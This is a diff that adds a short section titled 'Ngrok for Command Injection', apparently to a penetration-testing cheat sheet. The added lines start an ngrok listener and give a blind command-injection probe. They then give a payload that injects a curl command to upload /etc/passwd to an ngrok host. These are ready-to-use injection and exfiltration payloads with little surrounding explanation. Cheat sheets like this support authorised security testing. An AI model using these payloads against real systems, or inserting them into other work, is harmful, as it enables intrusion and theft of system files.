@@ -500,6 +500,19 @@ command `
 $(command )
 ```
 
+Ngrok for Command Injection:
+
+```
+# Start listener
+$ ./ngrok http 80
+
+# Test for blind injection
+Input field - > ;%20curl%20blablabla.ngrok.io
+
+# Take it all
+Input field -> ;curl%20-F%20shl=@/etc/passwd%20blablabla.ngrok.io
+```
+
 Useful Commands: Linux
 
 ```
